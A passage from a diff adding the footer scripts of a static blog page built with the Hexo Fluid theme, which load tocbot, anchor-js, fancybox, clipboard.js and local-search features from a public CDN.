+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
